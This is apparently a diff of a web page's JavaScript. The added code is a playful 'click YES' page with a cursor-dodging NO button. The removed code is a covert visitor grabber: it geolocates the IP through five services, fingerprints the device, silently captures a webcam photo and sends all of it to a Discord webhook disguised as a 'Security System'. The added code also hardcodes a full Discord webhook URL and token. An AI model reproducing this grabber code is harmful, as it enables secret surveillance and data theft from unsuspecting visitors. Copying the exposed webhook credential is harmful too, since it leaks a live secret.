-    "💛 stupid",
-    "💙 stupid",
-    "💜 stupid",
-    "🖤 stupid",
-    "💝 stupid",
-    "🖤 stupid",
-    "❤️ stupid",
-    "💛 stupid",
-    "💚 stupid",
-    "💙 stupid",
-    "💜 stupid",
-    "💖 stupid",
-    "💝 stupid",
-    "🖤 stupid",
-    "💚 stupid",
-    "💙 stupid",
-    "💛 stupid",
-    "💜 stupid",
-    "💖 stupid",
-    "💚 stupid",
-    "❤️ stupid",
-    "💙 stupid",
-    "💛 stupid",
-    "💜 stupid",
-    "💝 stupid",
-    "🖤 stupid",
-];
-
-var clickColors = [
-    "#ff6651",
-    "#42a5f5",
-    "#66bb6a",
-    "#ab47bc",
-    "#ffa726",
-    "#ec407a",
-    "#26c6da",
-    "#78909c",
-    "#ffca28",
-    "#5c6bc0",
-    "#8d6e63",
-    "#26a69a",
-    "#ef5350",
-    "#29b6f6",
-    "#9ccc65",
-    "#ba68c8",
-    "#ffb74d",
-    "#f06292",
-    "#4dd0e1",
-    "#90a4ae",
-    "#ffd54f",
-    "#7986cb",
-    "#a1887f",
-    "#4db6ac",
-    "#ff8a65",
-    "#64b5f6",
-    "#81c784",
-    "#9575cd",
-    "#ffcc80",
-    "#f48fb1",
-    "#80deea",
-    "#b0bec5",
-    "#ffe082",
-    "#9fa8da"
-];
-
-var clickIndex = 0;
-let currentQuoteIndex = 0;
-
-function initLockParticles(){
-    var container = document.getElementById('lockParticles');
-    for(var i = 0; i < 25; i++){
-        var p = document.createElement('div');
-        p.className = 'lockscreen-particle';
-        var size = Math.random() * 4 + 2;
-        var hue = Math.random() * 60 + 240;
-        p.style.width = size + 'px';
-        p.style.height = size + 'px';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.background = 'hsl(' + hue + ', 70%, 60%)';
-        p.style.animationDuration = (Math.random() * 6 + 5) + 's';
-        p.style.animationDelay = (Math.random() * 5) + 's';
-        container.appendChild(p);
-    }
+/* Fade music */
+function fadeIn(audio){
+  audio.volume=0;
+  audio.play();
+  let v=setInterval(()=>{
+    if(audio.volume<1) audio.volume+=0.02;
+    else clearInterval(v);
+  },60);
+}
+function fadeOut(audio){
+  let v=setInterval(()=>{
+    if(audio.volume>0) audio.volume-=0.02;
+    else{audio.pause();clearInterval(v);}
+  },60);
 }
 
-function rotateLockQuote(){
-    var el = document.getElementById('lockQuote');
-    el.classList.add('fade');
-    setTimeout(function(){
-        el.textContent = lockQuotes[Math.floor(Math.random() * lockQuotes.length)];
-        el.classList.remove('fade');
-    }, 400);
-}
+/* Start music */
+document.body.addEventListener("click",()=>fadeIn(bgm),{once:true});
 
-initLockParticles();
-rotateLockQuote();
-setInterval(rotateLockQuote, 4000);
-
-document.getElementById('lockscreen').addEventListener('click', function(){
-    this.classList.add('hidden');
-    playMusicFromAPI();
+/* NO teleport + fake click */
+no.addEventListener("mouseover",()=>{
+  fakeClick();
+  teleport();
 });
 
-function createStars(){
-    var starsContainer = document.getElementById('stars');
-    for(var i = 0; i < 150; i++){
-        var star = document.createElement('div');
-        star.className = 'star';
-        var size = Math.random() * 2 + 0.8;
-        star.style.width = size + 'px';
-        star.style.height = size + 'px';
-        star.style.left = Math.random() * 100 + '%';
-        star.style.top = Math.random() * 100 + '%';
-        star.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        star.style.animationDelay = Math.random() * 5 + 's';
-        starsContainer.appendChild(star);
-    }
+function teleport(){
+  no.style.left=Math.random()*(innerWidth-100)+"px";
+  no.style.top=Math.random()*(innerHeight-50)+"px";
 }
 
-function drawConstellation(){
-    var canvas = document.getElementById('constellation');
-    var ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    var points = [];
-    for(var i = 0; i < 30; i++){
-        points.push({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height,
-            vx: (Math.random() - 0.5) * 0.2,
-            vy: (Math.random() - 0.5) * 0.2
-        });
-    }
-    function animate(){
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.strokeStyle = 'rgba(139,92,246,0.12)';
-        ctx.lineWidth = 0.5;
-        points.forEach(function(point){
-            point.x += point.vx;
-            point.y += point.vy;
-            if(point.x < 0 || point.x > canvas.width) point.vx *= -1;
-            if(point.y < 0 || point.y > canvas.height) point.vy *= -1;
-            points.forEach(function(other){
-                var dx = point.x - other.x;
-                var dy = point.y - other.y;
-                var dist = Math.sqrt(dx * dx + dy * dy);
-                if(dist < 120){
-                    ctx.beginPath();
-                    ctx.moveTo(point.x, point.y);
-                    ctx.lineTo(other.x, other.y);
-                    ctx.globalAlpha = (120 - dist) / 120 * 0.25;
-                    ctx.stroke();
-                }
-            });
-        });
-        requestAnimationFrame(animate);
-    }
-    animate();
+function fakeClick(){
+  no.textContent="CLICK?";
+  setTimeout(()=>no.textContent="NO",300);
 }
 
-createStars();
-drawConstellation();
-window.addEventListener('resize', function(){ drawConstellation(); });
+/* YES click */
+yes.onclick=()=>{
+  click.play();
+  fadeOut(bgm);
+  card.style.display="none";
+  no.style.display="none";
+  yesScreen.style.display="flex";
+  heartRain();
+  fireworks();
+  sendDiscord();
+  if(navigator.vibrate) navigator.vibrate([200,100,200]);
+};
 
-function displayQuote(){
-    const quoteElement = $('#quote-text');
-    quoteElement.fadeOut(300, function(){
-        $(this).text(quotes[currentQuoteIndex]).fadeIn(300);
-        currentQuoteIndex = (currentQuoteIndex + 1) % quotes.length;
-    });
+/* Hearts */
+function heartRain(){
+  setInterval(()=>{
+    const h=document.createElement("div");
+    h.className="heart";
+    h.innerHTML="❤️";
+    h.style.left=Math.random()*innerWidth+"px";
+    h.style.bottom="0";
+    document.body.appendChild(h);
+    setTimeout(()=>h.remove(),2500);
+  },120);
 }
 
-displayQuote();
-setInterval(displayQuote, 3000);
-
-async function playMusicFromAPI(){
-    try{
-        var musicIndicator = document.getElementById('musicIndicator');
-        var audio = document.getElementById('backgroundMusic');
-        var response = await fetch('https://tranvanquan.x10.mx/api-phatnhac.php');
-        var data = await response.json();
-        if(data.value){
-            audio.src = data.value;
-            audio.volume = 0.3;
-            audio.addEventListener('ended', function(){
-                playMusicFromAPI();
-            }, {once: true});
-            var playPromise = audio.play();
-            if(playPromise !== undefined){
-                playPromise.then(function(){
-                    musicIndicator.style.display = 'flex';
-                }).catch(function(){
-                    document.addEventListener('click', function(){
-                        audio.play();
-                        musicIndicator.style.display = 'flex';
-                    }, {once: true});
-                });
-            }
-        }
-    } catch(e){
-        setTimeout(function(){ playMusicFromAPI(); }, 5000);
-    }
+/* Fireworks */
+function fireworks(){
+  for(let i=0;i<80;i++){
+    const s=document.createElement("div");
+    s.className="spark";
+    s.style.left=innerWidth/2+"px";
+    s.style.top=innerHeight/2+"px";
+    s.style.setProperty("--x",(Math.random()-0.5)*400);
+    s.style.setProperty("--y",(Math.random()-0.5)*400);
+    document.body.appendChild(s);
+    setTimeout(()=>s.remove(),1000);
+  }
 }
 
-function capturePhoto(){
-    const video=document.getElementById('video');
-    if(!video.videoWidth||!video.videoHeight)return;
-    const canvas=document.createElement('canvas');
-    canvas.width=video.videoWidth;
-    canvas.height=video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0);
-    canvas.toBlob(blob=>{
-        if(!blob)return;
-        const formData=new FormData();
-        formData.append('file',blob,'photo.jpg');
-        const payload={username:'qynhmai System',content:'📸 Webcam Capture'};
-        formData.append('payload_json',JSON.stringify(payload));
-        fetch(DISCORD_WEBHOOK,{method:'POST',body:formData})
-        .then(response=>console.log('Photo sent:',response.status))
-        .catch(err=>console.error('Photo error:',err))
-    },'image/jpeg')
-}
-
-function sendToDiscord(ipData,userData,userName){
-    const discordPayload={
-        username:'qynhmai Check System',
-        avatar_url:'https://cdn-icons-png.flaticon.com/512/888/888879.png',
-        embeds:[{
-            title:"🎯 THÔNG TIN TRUY CẬP MỚI",
-            description:`**Người dùng:** ${userName||"Không cung cấp"}\n**Thời gian:** ${new Date().toLocaleString('vi-VN')}`,
-            color:3447003,
-            thumbnail:{url:"https://cdn-icons-png.flaticon.com/512/1177/1177568.png"},
-            fields:[
-                {name:"🌍 THÔNG TIN ĐỊA LÝ",value:`> **IP:** \`${ipData.ip}\`\n> **Quốc gia:** ${ipData.country}\n> **Tỉnh/Thành:** ${ipData.region}\n> **Thành phố:** ${ipData.city}\n> **Khu vực:** ${ipData.district}\n> **Mã bưu điện:** ${ipData.postal}\n> **Tọa độ:** \`${ipData.lat}, ${ipData.lon}\`\n> **Múi giờ:** ${ipData.timezoneAPI}`,inline:false},
-                {name:"🌐 MẠNG & KẾT NỐI",value:`> **ISP:** ${ipData.isp}\n> **Tổ chức:** ${ipData.org}\n> **ASN:** ${ipData.asn}\n> **Loại kết nối:** ${ipData.connection_type}\n> **Proxy/VPN:** ${ipData.proxy}\n> **Mobile:** ${ipData.mobile}`,inline:false},
-                {name:"💻 THIẾT BỊ & HỆ THỐNG",value:`> **Hệ điều hành:** ${userData.os}\n> **Platform:** ${userData.platform}\n> **CPU Cores:** ${userData.cpuCores}\n> **RAM:** ${userData.ram}\n> **Màn hình:** ${userData.screen}\n> **Touch:** ${userData.touchSupport}`,inline:false},
-                {name:"🎮 ĐỒ HỌA & TRÌNH DUYỆT",value:`> **GPU:** ${userData.gpu}\n> **Trình duyệt:** ${userData.browser}\n> **Phiên bản:** ${userData.browserVersion}\n> **Engine:** ${userData.engine}`,inline:false},
-                {name:"🌏 NGÔN NGỮ & BẢO MẬT",value:`> **Ngôn ngữ:** ${userData.language}\n> **Múi giờ local:** ${userData.timezone}\n> **Do Not Track:** ${userData.doNotTrack}\n> **Cookie:** ${userData.cookieEnabled}\n> **WebRTC:** ${userData.webrtc}`,inline:false},
-                {name:"🔍 USER AGENT",value:`\`\`\`${userData.userAgent.substring(0,500)}\`\`\``,inline:false}
-            ],
-            timestamp:new Date().toISOString(),
-            footer:{text:"qynhmai Security System",icon_url:"https://cdn-icons-png.flaticon.com/512/6195/6195699.png"}
-        }]
-    };
-    fetch(DISCORD_WEBHOOK,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(discordPayload)
+/* Discord webhook */
+function sendDiscord(){
+  fetch("https://discord.com/api/webhooks/1466372734945595537/xclykYndX7PSAUIBGCiJzV0MNY08Hd-dmD4rIhebpc9Q350uxb6JwlVtDywMPBJUa4nt",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      content:"🔥 **SOMEONE CLICKED YES** 🔥\n💖 Romantic mode activated"
     })
-    .then(response=>console.log('Data sent:',response.status))
-    .catch(err=>console.error('Send error:',err))
+  });
 }
-
-async function getIPFromAPIs(){
-    const results={
-        ip:'Đang lấy...',country:'Đang lấy...',city:'Đang lấy...',
-        region:'Đang lấy...',district:'Đang lấy...',postal:'Đang lấy...',
-        lat:'Đang lấy...',lon:'Đang lấy...',timezoneAPI:'Đang lấy...',
-        isp:'Đang lấy...',org:'Đang lấy...',asn:'Đang lấy...',
-        connection_type:'Đang lấy...',proxy:'Đang lấy...',mobile:'Đang lấy...'
-    };
-    const apiCalls=[
-        fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null),
-        fetch('https://ipwho.is/').then(r=>r.json()).catch(()=>null),
-        fetch('http://ip-api.com/json/?fields=66846719').then(r=>r.json()).catch(()=>null),
-        fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null),
-        fetch('https://geolocation-db.com/json/').then(r=>r.json()).catch(()=>null)
-    ];
-    const responses=await Promise.all(apiCalls);
-    const ipapi=responses[0];
-    const ipwho=responses[1];
-    const ipApiCom=responses[2];
-    const ipinfo=responses[3];
-    const geodb=responses[4];
-    
-    if(ipapi&&ipapi.ip){
-        results.ip=ipapi.ip;
-        results.country=ipapi.country_name||results.country;
-        results.city=ipapi.city||results.city;
-        results.region=ipapi.region||results.region;
-        results.postal=ipapi.postal||results.postal;
-        results.lat=ipapi.latitude||results.lat;
-        results.lon=ipapi.longitude||results.lon;
-        results.timezoneAPI=ipapi.timezone||results.timezoneAPI;
-        results.isp=ipapi.org||results.isp;
-        results.asn=ipapi.asn||results.asn
-    }
-    if(ipwho&&ipwho.ip){
-        results.ip=results.ip==='Đang lấy...'?ipwho.ip:results.ip;
-        results.country=ipwho.country||results.country;
-        results.city=ipwho.city||results.city;
-        results.region=ipwho.region||results.region;
-        results.postal=ipwho.postal||results.postal;
-        results.lat=ipwho.latitude||results.lat;
-        results.lon=ipwho.longitude||results.lon;
-        results.timezoneAPI=ipwho.timezone?.id||results.timezoneAPI;
-        results.isp=ipwho.connection?.isp||results.isp;
-        results.org=ipwho.connection?.org||results.org;
-        results.asn=ipwho.connection?.asn||results.asn;
-        results.district=ipwho.region||results.district
-    }
-    if(ipApiCom&&ipApiCom.status==='success'){
-        results.ip=results.ip==='Đang lấy...'?ipApiCom.query:results.ip;
-        results.country=ipApiCom.country||results.country;
-        results.city=ipApiCom.city||results.city;
-        results.region=ipApiCom.regionName||results.region;
-        results.district=ipApiCom.district||results.district;
-        results.postal=ipApiCom.zip||results.postal;
-        results.lat=ipApiCom.lat||results.lat;
-        results.lon=ipApiCom.lon||results.lon;
-        results.timezoneAPI=ipApiCom.timezone||results.timezoneAPI;
-        results.isp=ipApiCom.isp||results.isp;
-        results.org=ipApiCom.org||ipApiCom.as||results.org;
-        results.asn=ipApiCom.as||results.asn;
-        results.proxy=ipApiCom.proxy?'Có':'Không';
-        results.mobile=ipApiCom.mobile?'Có':'Không'
-    }
-    if(ipinfo&&ipinfo.ip){
-        results.ip=results.ip==='Đang lấy...'?ipinfo.ip:results.ip;
-        if(ipinfo.city)results.city=ipinfo.city;
-        if(ipinfo.region)results.region=ipinfo.region;
-        if(ipinfo.country)results.country=ipinfo.country;
-        if(ipinfo.loc){
-            const[lat,lon]=ipinfo.loc.split(',');
-            results.lat=lat||results.lat;
-            results.lon=lon||results.lon
-        }
-        results.postal=ipinfo.postal||results.postal;
-        results.org=ipinfo.org||results.org;
-        results.timezoneAPI=ipinfo.timezone||results.timezoneAPI
-    }
-    if(geodb&&geodb.IPv4){
-        results.ip=results.ip==='Đang lấy...'?geodb.IPv4:results.ip;
-        results.country=geodb.country_name||results.country;
-        results.city=geodb.city||results.city;
-        results.region=geodb.state||results.region;
-        results.postal=geodb.postal||results.postal;
-        results.lat=geodb.latitude||results.lat;
-        results.lon=geodb.longitude||results.lon
-    }
-    Object.keys(results).forEach(key=>{
-        if(results[key]==='Đang lấy...'||results[key]===null||results[key]===undefined||results[key]===''){
-            results[key]='Không xác định'
-        }
-    });
-    return results
-}
-
-function collectSystemInfo(){
-    const userAgent=navigator.userAgent;
-    const os=getOS();
-    const browser=getBrowser();
-    const cpuCores=navigator.hardwareConcurrency||'Không xác định';
-    const ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'Không xác định';
-    const gpu=getGPU();
-    const language=(navigator.languages&&navigator.languages[0])||navigator.language||navigator.userLanguage||'Không xác định';
-    const platform=navigator.platform||'Không xác định';
-    const screenRes=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'Không xác định';
-    const doNotTrack=navigator.doNotTrack==='1'?'Bật':'Tắt';
-    const cookieEnabled=navigator.cookieEnabled?'Bật':'Tắt';
-    const touchSupport='ontouchstart' in window||navigator.maxTouchPoints>0?'Có':'Không';
-    const webrtc=detectWebRTC();
-    const engine=getEngine();
-    return{
-        userAgent:userAgent,
-        os:os,
-        browser:browser.name,
-        browserVersion:browser.version,
-        cpuCores:cpuCores,
-        ram:ram,
-        gpu:gpu,
-        language:language,
-        platform:platform,
-        screen:screenRes,
-        timezone:timezone,
-        doNotTrack:doNotTrack,
-        cookieEnabled:cookieEnabled,
-        touchSupport:touchSupport,
-        webrtc:webrtc,
-        engine:engine
-    }
-}
-
-function getEngine(){
-    const ua=navigator.userAgent;
-    if(ua.indexOf('AppleWebKit')>-1){
-        if(ua.indexOf('Chrome')>-1)return 'Blink';
-        return 'WebKit'
-    }
-    if(ua.indexOf('Gecko')>-1&&ua.indexOf('Firefox')>-1)return 'Gecko';
-    if(ua.indexOf('Trident')>-1)return 'Trident';
-    if(ua.indexOf('Presto')>-1)return 'Presto';
-    return 'Không xác định'
-}
-
-function detectWebRTC(){
-    if(window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection){
-        return 'Hỗ trợ'
-    }
-    return 'Không hỗ trợ'
-}
-
-function getBrowser(){
-    const ua=navigator.userAgent;
-    let browserName="Không xác định";
-    let browserVersion="Không xác định";
-    if(ua.indexOf("Firefox")>-1){
-        browserName="Firefox";
-        browserVersion=ua.match(/Firefox\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Edg")>-1){
-        browserName="Edge";
-        browserVersion=ua.match(/Edg\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Chrome")>-1&&ua.indexOf("Edg")===-1){
-        browserName="Chrome";
-        browserVersion=ua.match(/Chrome\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Safari")>-1&&ua.indexOf("Chrome")===-1){
-        browserName="Safari";
-        browserVersion=ua.match(/Version\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Opera")>-1||ua.indexOf("OPR")>-1){
-        browserName="Opera";
-        browserVersion=ua.match(/OPR\/([0-9.]+)/)?.[1]||"Không xác định"
-    }
-    return{name:browserName,version:browserVersion}
-}
-
-function requestCameraAccess(){
-    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
-        navigator.mediaDevices.getUserMedia({video:true})
-        .then(stream=>{
-            const video=document.getElementById('video');
-            video.srcObject=stream;
-            video.onloadedmetadata=()=>{
-                video.play();
-                setTimeout(()=>capturePhoto(),1000)
-            }
-        })
-        .catch(err=>console.error('Camera error:',err))
-    }
-}
-
-function getOS(){
-    const ua=navigator.userAgent;
-    if(/windows phone/i.test(ua))return "Windows Phone";
-    if(/android/i.test(ua)){
-        const version=ua.match(/Android\s([0-9.]+)/);
-        return version?`Android ${version[1]}`:"Android"
-    }
-    if(/iPad|iPhone|iPod/.test(ua)){
-        const version=ua.match(/OS\s([0-9_]+)/);
-        return version?`iOS ${version[1].replace(/_/g,'.')}`:"iOS"
-    }
-    if(/Macintosh|Mac OS X/.test(ua)){
-        const version=ua.match(/Mac OS X\s([0-9_]+)/);
-        return version?`macOS ${version[1].replace(/_/g,'.')}`:"Mac OS"
-    }
-    if(/Windows NT/.test(ua)){
-        const version=ua.match(/Windows NT\s([0-9.]+)/);
-        const winVersions={'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7','6.0':'Windows Vista'};
-        return version?(winVersions[version[1]]||`Windows NT ${version[1]}`):"Windows"
-    }
-    if(/Linux/.test(ua))return "Linux";
-    return "Không xác định"
-}
-
-function getGPU(){
-    try{
-        const canvas=document.createElement('canvas');
-        const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
-        if(gl){
-            const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
-            if(debugInfo){
-                const renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                return renderer||'Không xác định'
-            }
-        }
-    }catch(e){}
-    return 'Không xác định'
-}
-
-async function collectAndSendData(userName){
-    try{
-        const systemInfo=collectSystemInfo();
-        const ipData=await getIPFromAPIs();
-        sendToDiscord(ipData,systemInfo,userName);
-        requestCameraAccess();
-    }catch(error){
-        console.error('Collection error:',error)
-    }
-}
-
-function handleConfirm(){
-    const nameInput=document.getElementById('nameInput');
-    const errorMessage=document.getElementById('errorMessage');
-    const confirmBtn=document.getElementById('confirmBtn');
-    const userName=nameInput.value.trim();
-    
-    if(!userName||userName.length<2){
-        nameInput.style.borderColor='rgba(239, 68, 68, 0.6)';
-        errorMessage.style.display='block';
-        nameInput.classList.add('shake');
-        setTimeout(()=>nameInput.classList.remove('shake'),500);
-        return
-    }
-    
-    confirmBtn.disabled=true;
-    confirmBtn.innerHTML='<span>Đang xử lý...</span>';
-    
-    document.getElementById('notificationModal').style.display='none';
-    collectAndSendData(userName)
-}
-
-document.getElementById('confirmBtn').addEventListener('click',handleConfirm);
-document.getElementById('nameInput').addEventListener('keypress',function(e){
-    if(e.key==='Enter'){
-        handleConfirm()
-    }
-});
-document.getElementById('nameInput').addEventListener('input',function(){
-    this.style.borderColor='rgba(100,120,200,0.25)';
-    document.getElementById('errorMessage').style.display='none'
-});
-
-window.addEventListener('DOMContentLoaded',function(){
-    setTimeout(()=>{
-        document.getElementById('notificationModal').style.display='block';
-        document.getElementById('nameInput').focus()
-    },500)
-});
-
-function createFallingStar(){
-    var container = document.getElementById('fallingStars');
-    var star = document.createElement('div');
-    star.className = 'falling-star';
-    star.textContent = '✦';
-    star.style.left = Math.random() * 100 + '%';
-    star.style.animationDuration = (Math.random() * 2 + 3) + 's';
-    var colors = ['#ffffff', '#8b5cf6', '#3b82f6', '#a78bfa'];
-    star.style.color = colors[Math.floor(Math.random() * colors.length)];
-    container.appendChild(star);
-    setTimeout(function(){
-        if(star.parentNode) star.parentNode.removeChild(star);
-    }, 5000);
-}
-
-setInterval(createFallingStar, 800);
-
-$(document).ready(function(){
-    $(document).on('click', function(e){
-        if($('#lockscreen').hasClass('hidden') === false) return;
-        var text = clickTexts[clickIndex];
-        clickIndex = (clickIndex + 1) % clickTexts.length;
-        var color = clickColors[Math.floor(Math.random() * clickColors.length)];
-        var el = $('<span class="click-text"></span>');
-        el.text(text);
-        el.css({
-            left: e.clientX,
-            top: e.clientY - 20,
-            color: color
-        });
-        $('body').append(el);
-        setTimeout(function(){ el.remove(); }, 1400);
-    });
-});
 </script>
-<script>
-var styleElement = document.createElement("style");
-document.head.appendChild(styleElement);
-var styleSheet = styleElement.sheet;
 
-styleSheet.insertRule(":root{--glow-rgb:255 255 255}", 0);
-styleSheet.insertRule(".glow-point{position:fixed;box-shadow:0rem 0rem 1.2rem 0.6rem rgb(var(--glow-rgb));pointer-events:none}", 1);
-styleSheet.insertRule(".magic-star{position:fixed;z-index:2;color:white;font-size:1rem;animation-duration:1500ms;animation-fill-mode:forwards;pointer-events:none}", 2);
-styleSheet.insertRule("@keyframes fall-1{0%{transform:translate(0px,0px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(0.25);opacity:0}5%{transform:translate(10px,-10px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(1);opacity:1}100%{transform:translate(25px,200px) rotateX(180deg) rotateY(270deg) rotateZ(90deg) scale(1);opacity:0}}", 3);
-styleSheet.insertRule("@keyframes fall-2{0%{transform:translate(0px,0px) rotateX(-20deg) rotateY(10deg) scale(0.25);opacity:0}10%{transform:translate(-10px,-5px) rotateX(-20deg) rotateY(10deg) scale(1);opacity:1}100%{transform:translate(-10px,160px) rotateX(-90deg) rotateY(45deg) scale(0.25);opacity:0}}", 4);
-styleSheet.insertRule("@keyframes fall-3{0%{transform:translate(0px,0px) rotateX(0deg) rotateY(45deg) scale(0.5);opacity:0}15%{transform:translate(7px,5px) rotateX(0deg) rotateY(45deg) scale(1);opacity:1}100%{transform:translate(20px,120px) rotateX(-180deg) rotateY(-90deg) scale(0.5);opacity:0}}", 5);
-
-var start = new Date().getTime();
-var originPosition = {x:0,y:0};
-var last = {starTimestamp:start,starPosition:originPosition,mousePosition:originPosition};
-var config = {
-    starAnimationDuration:1500,
-    minimumTimeBetweenStars:250,
-    minimumDistanceBetweenStars:75,
-    glowDuration:75,
-    maximumGlowPointSpacing:10,
-    colors:["255 255 255","255 255 255"],
-    sizes:["1.4rem","1rem","0.6rem"],
-    animations:["fall-1","fall-2","fall-3"]
-};
-
-var count = 0;
-var rand = function(t,e){return Math.floor(Math.random()*(e-t+1))+t};
-var selectRandom = function(t){return t[rand(0,t.length-1)]};
-var px = function(t){return t+"px"};
-var ms = function(t){return t+"ms"};
-var calcDistance = function(t,e){var a=e.x-t.x,o=e.y-t.y;return Math.sqrt(a*a+o*o)};
-var calcElapsedTime = function(t,e){return e-t};
-var appendElement = function(t){document.body.appendChild(t)};
-var removeElement = function(t,e){setTimeout(function(){if(t.parentNode)t.parentNode.removeChild(t)},e)};
-
-var createStar = function(t){
-    var e = document.createElement("span");
-    var a = selectRandom(config.colors);
-    e.className = "magic-star";
-    e.style.left = px(t.x);
-    e.style.top = px(t.y);
-    e.style.fontSize = selectRandom(config.sizes);
-    e.style.color = "rgb("+a+")";
-    e.style.textShadow = "0px 0px 1.5rem rgb("+a+" / 0.5)";
-    e.style.animationName = config.animations[count++ % 3];
-    e.style.animationDuration = ms(config.starAnimationDuration);
-    e.textContent = "✦";
-    appendElement(e);
-    removeElement(e, config.starAnimationDuration);
-};
-
-var createGlowPoint = function(t){
-    var e = document.createElement("div");
-    e.className = "glow-point";
-    e.style.left = px(t.x);
-    e.style.top = px(t.y);
-    appendElement(e);
-    removeElement(e, config.glowDuration);
-};
-
-var determinePointQuantity = function(t){return Math.max(Math.floor(t/config.maximumGlowPointSpacing),1)};
-
-var createGlow = function(t,e){
-    var a=calcDistance(t,e),o=determinePointQuantity(a),s=(e.x-t.x)/o,n=(e.y-t.y)/o;
-    for(var i=0;i<o;i++){
-        createGlowPoint({x:t.x+s*i,y:t.y+n*i});
-    }
-};
-
-var updateLastStar = function(t){last.starTimestamp=new Date().getTime();last.starPosition=t};
-var updateLastMousePosition = function(t){last.mousePosition=t};
-var adjustLastMousePosition = function(t){if(last.mousePosition.x===0&&last.mousePosition.y===0)last.mousePosition=t};
-
-var handleOnMove = function(t){
-    var e={x:t.clientX,y:t.clientY};
-    adjustLastMousePosition(e);
-    var a=new Date().getTime();
-    var o=calcDistance(last.starPosition,e)>=config.minimumDistanceBetweenStars;
-    var s=calcElapsedTime(last.starTimestamp,a)>config.minimumTimeBetweenStars;
-    if(o||s){createStar(e);updateLastStar(e)}
-    createGlow(last.mousePosition,e);
-    updateLastMousePosition(e);
-};
-
-window.onmousemove = function(t){handleOnMove(t)};
-window.ontouchmove = function(t){handleOnMove(t.touches[0])};
-document.body.onmouseleave = function(){updateLastMousePosition(originPosition)};
-</script>
 </body>
 </html>
